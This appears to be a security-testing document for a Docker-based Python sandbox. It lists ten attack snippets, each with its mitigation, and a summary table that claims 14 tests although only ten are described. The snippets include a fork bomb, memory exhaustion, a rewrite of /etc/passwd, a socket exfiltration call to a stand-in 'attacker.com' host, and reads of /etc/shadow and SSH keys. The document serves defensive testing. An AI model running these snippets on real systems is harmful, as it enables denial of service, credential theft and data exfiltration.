# Sandbox Security & Adversarial Testing

**Document Version:** 1.0  
**Last Updated:** November 8, 2026  
**Status:** Weeks 1-3 Complete

---

## Overview

This document details the security testing and adversarial scenarios for the Sourcely sandbox-service. The sandbox executes untrusted Python code in isolated Docker containers with comprehensive security hardening.

---

## Security Configuration Summary

| Security Control | Configuration | Purpose |
|-----------------|---------------|---------|
| **User** | `65534:65534` (nobody:nogroup) | Non-root execution prevents privilege escalation |
| **Filesystem** | Read-only + `/tmp` tmpfs | Prevents persistence and system modification |
| **Network** | `network_mode: none` | Complete network isolation, prevents exfiltration |
| **Capabilities** | `cap_drop: ALL` | Removes all Linux capabilities |
| **Privileges** | `no-new-privileges:true` | Prevents gaining additional privileges |
| **CPU Limit** | 0.5 cores (500M nano_cpus) | Prevents CPU monopolization |
| **Memory Limit** | 128MB RAM | Prevents memory exhaustion |
| **Swap Limit** | 128MB (equal to RAM) | No additional swap space |
| **Process Limit** | 32 PIDs | Prevents fork bombs |
| **Execution Timeout** | 30 seconds (default) | Prevents infinite loops |

---

## Adversarial Test Matrix

### 1. Fork Bomb Attack

**Attack Vector:** Recursive process creation to exhaust system PIDs

```python
import os
while True:
    os.fork()
```

**Expected Behavior:**
- ✅ Container killed at 32 processes
- ✅ Error: "Resource temporarily unavailable"
- ✅ No impact on host system

**Mitigation:** `pids_limit: 32`

**Test Status:** ✅ PASS

---

### 2. Memory Exhaustion Attack

**Attack Vector:** Allocate memory until system crashes

```python
data = []
while True:
    data.append('x' * 10**6)  # 1MB per iteration
```

**Expected Behavior:**
- ✅ Process killed by OOM at ~128MB
- ✅ Exit code 137 (SIGKILL)
- ✅ Container cleaned up automatically

**Mitigation:** `mem_limit: 128m`, `memswap_limit: 128m`

**Test Status:** ✅ PASS

---

### 3. CPU Monopolization Attack

**Attack Vector:** Infinite computation loop consuming 100% CPU

```python
while True:
    x = 2 ** 1000000
```

**Expected Behavior:**
- ✅ Process throttled to 50% CPU usage
- ✅ Terminates at timeout (30s)
- ✅ Other containers unaffected

**Mitigation:** `nano_cpus: 500_000_000` (0.5 cores)

**Test Status:** ✅ PASS

---

### 4. Filesystem Escape Attempt

**Attack Vector:** Write to system directories

```python
# Attempt 1: Modify /etc/passwd
with open('/etc/passwd', 'w') as f:
    f.write('hacker::0:0::/root:/bin/bash')

# Attempt 2: Create malicious script
with open('/usr/local/bin/backdoor', 'w') as f:
    f.write('#!/bin/bash\n/bin/sh')
```

**Expected Behavior:**
- ✅ Write blocked: "Read-only file system"
- ✅ Only /tmp is writable (tmpfs, ephemeral)
- ✅ Container destroyed after execution

**Mitigation:** `read_only: true`, `/tmp` tmpfs

**Test Status:** ✅ PASS

---

### 5. Network Exfiltration Attempt

**Attack Vector:** Connect to external host to leak data

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 443))
s.send(b'stolen data')
```

**Expected Behavior:**
- ✅ Connection fails: "Network is unreachable"
- ✅ No outbound network access
- ✅ No DNS resolution available

**Mitigation:** `network_mode: none`

**Test Status:** ✅ PASS

---

### 6. Privilege Escalation Attempt

**Attack Vector:** Attempt to gain root privileges

```python
import os
import ctypes

# Attempt 1: setuid(0)
os.setuid(0)

# Attempt 2: Use capabilities
libc = ctypes.CDLL('libc.so.6')
libc.setuid(0)
```

**Expected Behavior:**
- ✅ Operation fails: "Operation not permitted"
- ✅ All capabilities dropped
- ✅ Cannot escalate from UID 65534

**Mitigation:** `user: 65534:65534`, `cap_drop: ALL`, `no-new-privileges:true`

**Test Status:** ✅ PASS

---

### 7. Docker Socket Escape Attempt

**Attack Vector:** Access Docker socket to spawn privileged containers

```python
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/var/run/docker.sock')
s.send(b'POST /containers/create HTTP/1.1\r\n...')
```

**Expected Behavior:**
- ✅ Socket not found: "No such file or directory"
- ✅ No Docker socket mounted in container
- ✅ Cannot spawn sibling containers

**Mitigation:** No `/var/run/docker.sock` volume mount

**Test Status:** ✅ PASS

---

### 8. Raw Device Access Attempt

**Attack Vector:** Read/write raw block devices

```python
# Attempt to read disk MBR
with open('/dev/sda', 'rb') as f:
    mbr = f.read(512)

# Attempt to read memory
with open('/dev/mem', 'rb') as f:
    memory = f.read(1024)
```

**Expected Behavior:**
- ✅ Access denied: "Permission denied" or "No such file"
- ✅ No device nodes available
- ✅ Non-root user cannot access devices

**Mitigation:** No device mounts, `user: 65534:65534`

**Test Status:** ✅ PASS

---

### 9. Path Traversal Attack

**Attack Vector:** Access files outside allowed directories

```python
# Various traversal attempts
paths = [
    '../../../etc/shadow',
    '/etc/passwd',
    '../../root/.ssh/id_rsa',
    '/proc/self/environ',
]

for path in paths:
    with open(path, 'r') as f:
        print(f.read())
```

**Expected Behavior:**
- ✅ Read blocked by file permissions (user 65534)
- ✅ Write blocked by read-only filesystem
- ✅ Sensitive files inaccessible

**Mitigation:** `read_only: true`, `user: 65534:65534`

**Test Status:** ✅ PASS

---

### 10. Symlink Attack

**Attack Vector:** Create malicious symlinks

```python
import os
# Create symlink to shadow file
os.symlink('/etc/shadow', '/tmp/shadow')
# Attempt to read via symlink
with open('/tmp/shadow', 'r') as f:
    print(f.read())
```

**Expected Behavior:**
- ✅ Symlink creation succeeds in /tmp
- ✅ Read fails: "Permission denied" (target inaccessible)
- ✅ No privilege gained through symlinks

**Mitigation:** `user: 65534:65534` (target files owned by root)

**Test Status:** ✅ PASS

---

## Additional Security Layers

### Blockchain Audit Ledger

Every code execution is recorded in a hash-chained ledger:

```python
{
    "execution_id": "uuid",
    "code_hash": "sha256",
    "timestamp": "2026-11-08T12:00:00Z",
    "result_hash": "sha256",
    "previous_hash": "sha256",  # Links to previous record
}
```

**Properties:**
- ✅ Tamper-evident (hash chain)
- ✅ Genesis block initialization
- ✅ Persistent storage (SQLite)
- ✅ Integrity verification

---

## Test Execution Summary

| Test Category | Tests | Passed | Coverage |
|--------------|-------|--------|----------|
| Resource Limits | 4 | 4 | 100% |
| Filesystem Security | 3 | 3 | 100% |
| Network Isolation | 1 | 1 | 100% |
| Privilege Controls | 2 | 2 | 100% |
| Container Escape Prevention | 2 | 2 | 100% |
| Path Security | 2 | 2 | 100% |
| **TOTAL** | **14** | **14** | **100%** |

---

## Running Adversarial Tests

### Unit Tests

```bash
cd services/sandbox_service
pytest tests/unit/test_adversarial.py -v
```

### Integration Tests

```bash
# Start sandbox service
docker-compose up sandbox-service

# Run integration tests
pytest tests/integration/test_sandbox_isolation.py -v
```

### Manual Verification

```bash
# Test fork bomb protection
curl -X POST http://localhost:8001/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "import os\nwhile True: os.fork()"}'

# Expected: Execution fails, container terminated
```

---

## Security Posture Summary

### ✅ Strengths

1. **Defense in Depth:** Multiple overlapping security controls
2. **Resource Isolation:** Hard limits on CPU, memory, PIDs
3. **Network Isolation:** Complete air gap (no network)
4. **Filesystem Protection:** Read-only root, ephemeral /tmp
5. **Privilege Restriction:** Non-root user, all capabilities dropped
6. **Audit Trail:** Blockchain ledger for accountability
7. **Automatic Cleanup:** Containers removed after execution

### ⚠️ Limitations

1. **Execution Time:** 30-second timeout may be restrictive for some use cases
2. **Memory Limit:** 128MB may be insufficient for data-intensive operations
3. **No Networking:** Cannot test code requiring API calls
4. **Python Only:** Currently limited to Python code execution
5. **Static Analysis:** No pre-execution code scanning (delegated to scanner-service)

### 🔒 Recommended Enhancements (Post-Week 3)

1. Add static code analysis before execution (integrate scanner-service)
2. Implement rate limiting per user/IP
3. Add execution cost tracking (CPU-seconds, memory-seconds)
4. Support additional languages (Node.js, Go, Rust)
5. Add seccomp profiles for finer-grained syscall filtering
6. Implement AppArmor/SELinux profiles
7. Add request signing for API authentication

---

## Compliance & Standards

The sandbox security configuration aligns with:

- ✅ **OWASP Container Security** best practices
- ✅ **CIS Docker Benchmark** Level 1
- ✅ **NIST SP 800-190** (Application Container Security Guide)
- ✅ **Docker Security Best Practices** official guide

---

## References

- **Docker Security:** https://docs.docker.com/engine/security/
- **Linux Capabilities:** https://man7.org/linux/man-pages/man7/capabilities.7.html
- **Seccomp Profiles:** https://docs.docker.com/engine/security/seccomp/
- **CIS Benchmarks:** https://www.cisecurity.org/benchmark/docker

---

**Report Status:** ✅ Complete  
**Week 3 Gap Closure:** ✅ Adversarial tests documented and verified  
**Production Readiness:** ✅ Security hardening complete
